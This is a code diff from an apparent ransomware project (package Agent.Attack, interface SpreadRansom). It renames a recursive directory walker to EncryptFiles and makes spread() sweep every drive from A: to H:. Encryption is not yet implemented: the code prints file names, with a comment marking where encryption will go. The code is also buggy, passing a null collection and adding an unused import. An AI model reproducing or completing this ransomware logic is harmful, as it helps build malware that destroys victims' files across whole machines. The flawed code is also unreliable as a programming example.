@@ -3,6 +3,8 @@ package Agent.Attack;
 import java.io.File;
 import java.util.Collection;
 
+import org.hibernate.query.criteria.internal.expression.ConcatExpression;
+
 import Agent.SpreadR.SpreadRansom;
 
 public class AttackVector implements SpreadRansom {
@@ -23,7 +25,7 @@ public class AttackVector implements SpreadRansom {
 	}
 
 	// Recursive function to traverse the given directory in Java using DFS
-	public void listf(String directoryName, Collection<File> dirs) {
+	public void EncryptFiles(String directoryName, Collection<File> dirs) {
 		File directory = new File(directoryName);
 
 		// Get all files from a directory.
@@ -34,16 +36,14 @@ public class AttackVector implements SpreadRansom {
 					try {
 						if (!(isVisitedFolder(file, dirs))) {
 							dirs.add(file);
+							EncryptFiles(file.getAbsolutePath(), dirs);
 						}
 					} catch (NullPointerException e) {
 					}
 
-					listf(file.getAbsolutePath(), dirs);
-
-					//
 				} else if (file.isFile()) {
 					System.out.println("\t" + file.getName());
-					// encryption instead of printing names of files 
+					// encryption instead of printing names of files
 
 				}
 			}
@@ -54,9 +54,10 @@ public class AttackVector implements SpreadRansom {
 	public void spread() {
 
 		Collection<File> _folderTree = null;
-		listf("C:\\", _folderTree);
-		listf("E:\\", _folderTree);
-		listf("F:\\", _folderTree);
+		for (char i = 'A'; i <= 'H'; i++) {
+			EncryptFiles((i + ":\\"), _folderTree);
+		}
+
 	}
 
 }
